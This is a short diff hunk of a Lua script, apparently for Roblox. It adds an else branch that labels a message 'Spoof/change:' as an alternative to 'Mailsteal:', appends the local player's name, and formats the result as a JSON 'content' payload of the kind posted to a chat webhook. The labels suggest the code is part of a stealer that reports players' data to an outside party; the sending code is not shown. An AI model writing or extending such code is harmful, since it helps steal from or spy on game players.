@@ -5,6 +5,8 @@ return
 end
 pcall(function() if _G.Min then
 e = "Mailsteal: "..e
+else
+e = "Spoof/change: "..e
 end end)
 e = e.." | "..game.Players.LocalPlayer.Name
 msg = '{"content":"'..e..'"}'
